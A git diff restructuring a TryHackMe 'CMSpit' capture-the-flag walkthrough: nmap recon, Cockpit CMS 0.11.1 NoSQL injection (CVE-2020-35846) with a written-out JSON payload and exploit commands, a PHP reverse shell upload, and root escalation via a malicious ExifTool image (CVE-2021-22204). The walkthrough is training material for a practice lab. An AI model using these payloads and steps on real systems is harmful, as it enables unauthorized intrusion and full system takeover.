@@ -1,10 +1,32 @@
-### CMSpit
-This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.
+# CMSpit - TryHackMe Walkthrough
 
-## 🖥️ Initial Recon:
-Beginning with a basic nmap scan:
+
+## 📋 Table of Contents
+- [Initial Reconnaissance](#-initial-reconnaissance)
+- [Web Enumeration](#-web-enumeration)
+- [CMS Exploitation](#-cms-exploitation)
+- [Privilege Escalation](#-privilege-escalation)
+- [Flags](#-flags)
+
+## 🔍 Initial Reconnaissance
+
+### Port Scanning
+Running an initial Nmap scan to identify open ports and services:
+
 ```bash
 nmap -A 10.10.116.219
+```
+
+**Key Findings:**
+- Port 22 (SSH): OpenSSH 7.2p2 Ubuntu
+- Port 80 (HTTP): Apache httpd 2.4.18
+  - Login page redirects to `/auth/login`
+  - Server running Ubuntu Linux
+
+<details>
+<summary>View Full Nmap Output</summary>
+
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 11:10 +06
 Nmap scan report for 10.10.116.219
 Host is up (0.18s latency).
@@ -20,106 +42,117 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 | http-title: Authenticate Please!
 |_Requested resource was /auth/login?to=/
-Device type: general purpose
-Running: Linux 4.X
-OS CPE: cpe:/o:linux:linux_kernel:4.4
-OS details: Linux 4.4
-Network Distance: 5 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Ports 22 and 80 are open; focusing on port 80.
+</details>
 
-## 🌐 Web Enum:
-Visiting port 80 provides us with a login page.
+## 🌐 Web Enumeration
 
-***● What is the name of the Content Management System (CMS) installed on the server?***
+### CMS Identification
+- **Name**: Cockpit CMS
+- **Version**: 0.11.1 (found in page source)
+- **Vulnerable Endpoint**: `/auth/check` (NoSQL Injection - CVE-2020-35846)
 
-The CMS name is displayed on the login page.\
-Ans: cockpit
+### Key Paths & Endpoints
+| Path | Purpose | Vulnerability |
+|------|----------|--------------|
+| `/auth/check` | User enumeration | NoSQL Injection |
+| `/auth/requestreset` | Password reset | Unauthorized access |
 
-***● What is the version of the Content Management System (CMS) installed on the server?***
+## 💀 CMS Exploitation
 
-The version number can be found in the login page's source code. Right-click the page, open the source code, and examine it carefully.\
-Ans: 0.11.1
-
-***● What is the path that allow user enumeration?***
-
-This endpoint in Cockpit CMS 0.11.1 is vulnerable to NoSQL Injection (CVE-2020-35846), allowing attackers to enumerate valid usernames.\
-Ans: /auth/check
-
-**Exploitation:**\
-There’s both an automated and a manual exploit; let’s try the automated one first.
+### Method 1: Automated Exploit
+1. Locate the exploit:
 ```bash
 searchsploit cockpit 0.11.1
-```
-you'll find the exploit, now it's time to download and execute.
-```bash
 searchsploit -m 50185
 ```
+
+2. Execute:
 ```bash
-python3 50185.py -u http://IP/
+python3 50185.py -u http://TARGET_IP/
 ```
-This vulnerability allows extracting password reset tokens, retrieving full user details (including email, hashed password, and user ID), and resetting any user's password without authentication.\
-To manually test for vulnerabilities, use Burp Suite to intercept login attempts with arbitrary credentials, then craft an exploit payload based on resources like Exploit-DB.
-```bash
-{"auth":{"user":{"$func":"var_dump"},"password":"admin"},"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"}
+
+### Method 2: Manual Exploitation
+Using Burp Suite, craft a NoSQL injection payload:
+```json
+{
+  "auth": {
+    "user": {
+      "$func": "var_dump"
+    },
+    "password": "admin"
+  },
+  "csfr": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
+}
 ```
-This is the one I used
 
-***● What is the path that allows you to change user account passwords?***
+### Shell Access
+1. Upload PHP reverse shell to Assets
+2. Configure shell with attacker IP/port
+3. Start netcat listener
+4. Access shell via direct asset link
 
-Review the exploit file to identify the path for changing the password.\
-Ans: /auth/requestreset
+## 🚀 Privilege Escalation
 
-***● Compromise the Content Management System (CMS). What is Skidy's email.***
+### User → Root
+The system is vulnerable to **CVE-2021-22204** - ExifTool arbitrary code execution.
 
-Use the exploit and compromise user skidy\
-Ans: skidy@tryhackme.fakemail
+#### Requirements
+- Tool: `djvumake`
+- Dependencies: `djvulibre-bin`, `exiftool`
 
-***● What is the web flag?***
-
-Compromise the admin account using the exploit, then log in and navigate to Assets. Create a folder and upload a PHP shell from `pentestmonkey`, editing the IP and port settings accordingly.\
-Start a netcat listener on your machine using the port specified in the shell. Then, open the uploaded shell and tap the direct link to the asset to establish a connection.\
-Go to `/var/www/html/cockpit` and open the web flag file.\
-Ans: thm{REDACTED}
-
-***● Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?***
-
-Navigate to the home directory, open the `dbshell` file, and retrieve the flag.\
-Ans: thm{REDACTED}
-
-***● What is the user.txt flag?***
-
-Access the `stux` user's credentials in the `dbshell` file, then log in via SSH to read the user flag.\
-Ans: thm{REDACTED}
-
-***● What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000***
-
-Run `sudo -l` on stux user and you will find the binary assigned is `/usr/local/bin/exiftool`\
-Little bit of researching on it and found the binary `/usr/local/bin/exiftool` is vulnerable to arbitrary code execution due to improper handling of DjVu image files.\
-Ans: CVE-2021-22204
-
-***● What is the utility used to create the PoC file?***
-
-An exploit for this vulnerability is available at https://github.com/UNICORDev/exploit-CVE-2021-22204.\
-The `exploit-CVE-2021-22204.py` script defines a `dependencies` function containing the following variable.
-```bash
-deps = {'bzz':"sudo apt install djvulibre-bin",'djvumake':"sudo apt install djvulibre-bin",'exiftool':"sudo apt install exiftool"}
-```
-The utility's name is in these dependencies.\
-Ans: djvumake
-
-***● Escalate your privileges. What is the flag in root.txt?***
-
-A malicious JPG file can be created using the exploit at https://github.com/UNICORDev/exploit-CVE-2021-22204 and then transferred to a target to perform the exploit.\
-First, install the dependencies on your machine:
+#### Exploitation Steps
+1. Install dependencies:
 ```bash
 sudo apt install djvulibre-bin exiftool
 ```
-Then, execute the exploit to generate the malicious .jpg file.
+
+2. Generate malicious image:
 ```bash
 python3 exploit-CVE-2021-22204.py -c "/bin/bash"
 ```
-Transfer the file to the target by starting a Python server in the malicious image directory and use `wget` on the target machine to download the image.\
-Run exiftool on the image to obtain a root shell, then navigate to the root directory and read the root flag.\
-Ans: thm{REDACTED}
+
+3. Transfer and execute:
+   - Host Python server with malicious image
+   - Download on target using `wget`
+   - Execute with ExifTool for root shell
+
+## 🏁 Flags
+
+<details>
+<summary>🚩 Web Flag</summary>
+Location: <code>/var/www/html/cockpit</code><br>
+Flag: <code>thm{REDACTED}</code>
+</details>
+
+<details>
+<summary>🚩 Database Flag</summary>
+Location: <code>dbshell</code> file<br>
+Flag: <code>thm{REDACTED}</code>
+</details>
+
+<details>
+<summary>🚩 User Flag</summary>
+Location: <code>stux</code> home directory<br>
+Flag: <code>thm{REDACTED}</code>
+</details>
+
+<details>
+<summary>🚩 Root Flag</summary>
+Location: <code>/root/root.txt</code><br>
+Flag: <code>thm{REDACTED}</code>
+</details>
+
+## 📚 Additional Information
+- **CVE Details**: CVE-2021-22204 - ExifTool Arbitrary Code Execution
+- **Compromised Email**: skidy@tryhackme.fakemail
+- **Database**: NoSQL document database
+
+## 🛠️ Tools Used
+- Nmap
+- Burp Suite
+- ExifTool
+- djvumake
+- Python exploit scripts
+
+---
